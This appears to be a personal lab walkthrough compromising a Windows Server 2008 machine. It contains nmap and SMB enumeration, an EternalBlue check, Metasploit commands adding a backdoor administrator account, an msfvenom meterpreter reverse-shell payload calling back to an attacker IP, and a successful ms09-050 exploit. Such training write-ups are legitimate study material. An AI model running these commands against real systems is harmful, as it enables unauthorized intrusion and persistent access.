# NMAP

```
sudo nmap -sC -sV 192.168.247.40 -oN nmap-internal
```

![[PG/Windows/attachments/Pasted image 20250705125503.png]]

Box is old as shit 

Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds

![[PG/Windows/attachments/Pasted image 20250705130137.png]]

UDP scan
![[PG/Windows/attachments/Pasted image 20250705130359.png]]
- actually a lot of random things here

# SMB 

```
nxc smb 192.168.247.40 -u 'internal' -p 'internal' --shares
```

Windows 6.0 Build 6001 x32 (name:INTERNAL) (domain:internal)

![[PG/Windows/attachments/Pasted image 20250705125824.png]]

```
smbclient -L //192.168.247.40
```

![[PG/Windows/attachments/Pasted image 20250705125915.png]]

Looking up this old as Windows version and I do believe this is eternal blue. 

# Verify Eternal Blue Vuln

```
nmap -Pn -p445 --open --script smb-vuln-ms17-010 192.168.247.40
```

![[PG/Windows/attachments/Pasted image 20250705141515.png]]
- it is vulnerable 

## Exploit EternalBlue with Metasploit 

I don't have creds so..

```
use auxiliary/admin/smb/ms17_010_command
```

Add a user to the box

```
set COMMAND net user cadet Password1! /add
```

Set target 

```
set rhost 192.168.247.40
```

Run 

```
run
```

After this runs, add cadet to local admin group 

```
set CMD net localgroup administrators cadet /add
```

These metasploit modules don't work on x32 architectures :(


So.....eternal blue is a rabbit hole. 

## RDP

```
rdesktop internal
```


wtf

![[PG/Windows/attachments/Pasted image 20250705144649.png]]

- okay whatever 

# Port 5357 

https://www.speedguide.net/port.php?port=5357

There's an exploit for this port.. 

https://learn.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-063

Here's an exploit https://www.exploit-db.com/exploits/40280

Modify this script. 

Replace shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.152 LPORT=443 EXITFUNC=thread -f python
```

![[PG/Windows/attachments/Pasted image 20250705151641.png]]

- Replace buff with 'shell' for this exploit. I grow weary.

# Use metasploit

```
search ms09-050
```

```
use 0
```
![[PG/Windows/attachments/Pasted image 20250705152708.png]]

![[PG/Windows/attachments/Pasted image 20250705152838.png]]

This worked. UGH. 

![[PG/Windows/attachments/Pasted image 20250705152919.png]]


